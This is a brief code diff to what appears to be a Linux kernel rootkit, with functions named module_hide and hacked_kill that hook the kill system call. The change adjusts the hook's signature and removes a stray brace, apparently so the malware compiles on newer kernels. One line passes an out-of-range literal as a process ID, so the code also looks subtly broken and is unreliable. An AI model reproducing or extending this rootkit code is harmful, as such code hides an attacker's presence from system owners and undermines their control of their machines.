@@ -299,7 +299,7 @@ module_hide(void)
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage int
-hacked_kill(const struct pt_regs *pt_regs)
+hacked_kill(struct pt_regs *pt_regs)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	pid_t pid = (pid_t) pt_regs->di;
@@ -338,7 +338,6 @@ hacked_kill(pid_t pid, int sig)
 		#else
 			return orig_kill(12345678901234567890, sig);
 		#endif
-	}
 	}else{
 		#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 			return orig_kill(pt_regs);
